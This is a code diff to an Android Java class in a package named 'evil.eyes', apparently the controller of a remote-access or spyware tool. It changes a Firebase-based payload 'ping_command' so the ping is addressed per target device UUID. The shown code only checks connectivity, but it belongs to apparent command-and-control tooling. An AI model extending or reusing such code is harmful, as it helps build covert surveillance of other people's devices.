@@ -1,5 +1,7 @@
 package evil.eyes.core.helpers;
 
+import android.content.Context;
+
 import androidx.annotation.NonNull;
 
 import com.google.android.gms.tasks.OnCompleteListener;
@@ -10,6 +12,7 @@ import com.google.firebase.database.DatabaseException;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 
+import evil.eyes.core.DeviceConfig;
 import evil.eyes.core.interfaces.PayloadConnectionListner;
 
 public class PayloadConnection {
@@ -18,11 +21,20 @@ public class PayloadConnection {
         return new PayloadConnection();
     }
 
+    private Context context;
+
+    public PayloadConnection setContext(Context context){
+        this.context = context;
+        return this;
+    }
+
     public void checkPayloadConnection(PayloadConnectionListner payloadConnectionListner) {
+        String uuid_current = DeviceConfig.getInstance(context).initializeStorage().getSelectedDevice().getUUID();
         FirebaseDatabase
                 .getInstance()
                 .getReference("test")
-                .child("command")
+                .child(uuid_current)
+                .child("ping_command")
                 .setValue(System.currentTimeMillis() % 10)
                 .addOnCompleteListener(new OnCompleteListener<Void>() {
                     @Override
@@ -32,7 +44,8 @@ public class PayloadConnection {
                             FirebaseDatabase
                                     .getInstance()
                                     .getReference("test")
-                                    .child("command")
+                                    .child(uuid_current)
+                                    .child("ping_command")
                                     .addValueEventListener(new ValueEventListener() {
                                         @Override
                                         public void onDataChange(@NonNull DataSnapshot snapshot) {
